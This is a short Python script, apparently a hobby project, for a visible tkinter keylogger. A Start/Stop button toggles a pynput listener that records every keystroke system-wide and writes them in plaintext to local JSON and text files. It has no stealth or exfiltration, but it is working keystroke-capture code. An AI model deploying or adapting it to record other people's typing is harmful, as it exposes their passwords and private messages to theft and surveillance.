import tkinter as tk
from tkinter import *
from pynput import keyboard
import json

root = tk.Tk()
root.geometry('300x150')
root.title("KeyLogger Project")

key_list = []
x = False
key_strokes = ""

def update_txt_file(key):
    with open('logs.txt', 'w+') as key_stroke:
        key_stroke.write(key)

def update_json_file(key_list):
    with open('logs.json', 'wb') as key_log:
        key_list_bytes = json.dumps(key_list).encode()
        key_log.write(key_list_bytes) #for json file

def on_press(key):
    global x, key_list
    if btn['text'] != "Stop KeyLogger":
        return

    if x == False:
        key_list.append({'Pressed': f'{key}'})
        x = True
    if x == True:
        key_list.append({'Held': f'{key}'})
    update_json_file(key_list)

def on_release(key):
    global x, key_list, key_strokes
    if btn['text'] != "Stop KeyLogger":
        return

    key_list.append({'Released': f'{key}'})
    if x == True:
        x = False
    update_json_file(key_list)

    key_strokes += str(key)
    update_txt_file(key_strokes)

def butaction():
    if btn['text'] == "Start KeyLogger":
        btn.config(text="Stop KeyLogger")
        print("[+] KeyLogger Started")
    else:
        btn.config(text="Start KeyLogger")
        print("[-] KeyLogger Stopped")

keyboard.Listener(
    on_press=on_press,
    on_release=on_release
).start()

Label(root, text="KeyLogger", font='Verdana 11 bold').place(relx=0.5, rely=0.3, anchor=CENTER)

btn = Button(root, text="Start KeyLogger", command=butaction)
btn.place(relx=0.5, rely=0.6, anchor=CENTER)

root.mainloop()
